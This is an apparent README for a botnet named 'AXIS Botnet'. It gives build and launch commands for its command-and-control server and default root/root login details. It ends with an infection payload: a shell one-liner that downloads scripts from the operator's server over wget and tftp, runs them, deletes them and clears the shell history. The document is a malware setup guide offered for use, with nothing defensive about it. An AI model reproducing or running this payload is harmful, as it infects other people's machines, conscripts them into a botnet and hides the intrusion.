# AXIS Botnet

### INFO:
This project is no longer supported; it has been replaced by the Orbital Cannon.

### Installation:
* Linux only:
  * **recommended to use Centos 7**
  * `sudo python3 build.py AXIS_CC.c (server-ip)`
  * `gcc AXIS_CNC.c -o AXIS -pthread`
  * `sudo screen ./AXIS 606 1 909`
  
### Connect
* SSH Config:
  * PORT: 909
  * TYPE: RAW
  
* Password (default)
  * username: root
  * password: root
  
### Payload
* Payload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://(server-ip)/AXIS.sh; chmod 777 *; sh AXIS.sh; tftp -g (server-ip) -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c"
